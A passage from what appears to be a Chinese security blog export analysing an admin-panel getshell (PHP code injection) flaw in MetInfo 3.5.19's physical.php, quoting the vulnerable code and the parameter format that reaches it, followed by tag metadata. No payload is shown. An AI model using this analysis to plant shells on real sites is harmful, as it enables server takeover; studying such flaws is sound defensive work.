title=\"metinfo后台getshellexp分析\"></a>metinfo后台getshellexp分析</h3><p>漏洞版本<code>3.5.19</code>  漏洞文件路径<code>/admin/app/physical/physical.php</code><br>有趣的是<code>3.5.18</code>修复的后台getshell也是这个文件<br><code>3.5.18</code>漏洞分析 <a href=\"https://bbs.ichunqiu.com/thread-29582-1-1.html\" target=\"_blank\" rel=\"noopener\">点我</a><br>上次分析完后顺手审计一下那个文件，发现居然还有一个getshell漏洞。提交后没人理就发出来分享</p>\n<h4 id=\"漏洞代码\"><a href=\"#漏洞代码\" class=\"headerlink\" title=\"漏洞代码\"></a>漏洞代码</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">elseif($action==&quot;op&quot;)&#123;</span><br><span class=\"line\">\t// 不相关代码</span><br><span class=\"line\">\t$val=explode(&apos;|&apos;,$valphy);</span><br><span class=\"line\">    // 不相关代码</span><br><span class=\"line\">\tswitch($op)&#123;</span><br><span class=\"line\">\t   // 不相关代码</span><br><span class=\"line\">\t\tcase 3:</span><br><span class=\"line\">\t\t\t$fileaddr=explode(&apos;/&apos;,$val[1]);</span><br><span class=\"line\">\t\t\t$filedir=&quot;../../../&quot;.$fileaddr[0];  </span><br><span class=\"line\">\t\t\tif(!file_exists($filedir))&#123; @mkdir ($filedir, 0777); &#125; </span><br><span class=\"line\">\t\t\tif($fileaddr[1]==&quot;index.php&quot;)&#123;</span><br><span class=\"line\">\t\t\t\tif($val[2])&#123;</span><br><span class=\"line\">\t\t\t\t\tCopyindx(&quot;../../../&quot;.$val[1],$val[2]);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br></pre></td></tr></table></figure>\n<p>需要<code>op</code>参数为3才能进入漏洞代码流程，并且要正常执行，需要<code>fileaddr[1]=&#39;index.php&#39;</code>和<code>$val[2]</code>也就是valphy参数要为<code>xxx|xxx/index.php|xxx</code>格式</p>\n<p>查看<code>Copyindex</code>函数<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Copyindx($newindx,$type)&#123;</span><br><span class=\"line\">    if(!file_exists($newindx))&#123;</span><br><span class=\"line\">        if($type==3)&#123;</span><br><span class=\"line\">            //生成产品栏目index</span><br><span class=\"line\">            $oldcont =&quot;&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\n\\$cmodule=&apos;product_index&apos;;\\nrequire_once &apos;../include/module.php&apos;; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;&quot;;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            $oldcont =&quot;&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\nrequire_once &apos;../include/module.php&apos;; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $fp = fopen($newindx,w);</span><br><span class=\"line\">        fputs($fp, $oldcont);</span><br><span class=\"line\">        fclose($fp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以看到如果传入type参数不等于3,进入第二个流程.发现是单纯的字符串拼接,然后这个函数的参数我们都可控</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cjkk0wi2w0008r4nxq6e212ws","category_id":"cjkk0wi44000br4nx3wan86n0","_id":"cjkk0wi5l000lr4nxtsxjmib9"}],"PostTag":[{"post_id":"cjkk0wi0r0003r4nxg8rl2p4j","tag_id":"cjkk0wi2f0006r4nxykoa807h","_id":"cjkk0wi4u000er4nxe2ix31vm"},{"post_id":"cjkk0wi4u000fr4nxrchzgtml","tag_id":"cjkk0wi2f0006r4nxykoa807h","_id":"cjkk0wi5c000ir4nxd9k2kg5w"},{"post_id":"cjkk0wi220005r4nxuvyd4844","tag_id":"cjkk0wi2f0006r4nxykoa807h","_id":"cjkk0wi5k000kr4nxtevvpncs"},{"post_id":"cjkk0wi53000gr4nx2qad5hmd","tag_id":"cjkk0wi2f0006r4nxykoa807h","_id":"cjkk0wi5t000nr4nx0ltnkpag"},{"post_id":"cjkk0wi2w0008r4nxq6e212ws","tag_id":"cjkk0wi54000hr4nxfyckgz0a","_id":"cjkk0wi5u000or4nxjduag0sb"},{"post_id":"cjkk0wi3v000ar4nxwu3umwg2","tag_id":"cjkk0wi5s000mr4nx09iheicg","_id":"cjkk0wi65000qr4nxu3avrvma"},{"post_id":"cjkk0wi4f000cr4nx4oj4q81m","tag_id":"cjkk0wi60000pr4nx7gd391i4","_id":"cjkk0wi69000sr4nxr572pqcs"},{"post_id":"cjkk0wi5c000jr4nx8hrwn8g3","tag_id":"cjkk0wi68000rr4nxw5l5jj8t","_id":"cjkk0wi6d000tr4nx552kq082"}],"Tag":[{"name":"编程技术","_id":"cjkk0wi2f0006r4nxykoa807h"},{"name":"web安全","_id":"cjkk0wi54000hr4nxfyckgz0a"},{"name":"编程开发","_id":"cjkk0wi5s000mr4nx09iheicg"},{"name":"web安全     漏洞分析","_id":"cjkk0wi60000pr4nx7gd391i4"},{"name":"web安全    漏洞分析","_id":"cjkk0wi68000rr4nxw5l5jj8t"}]}}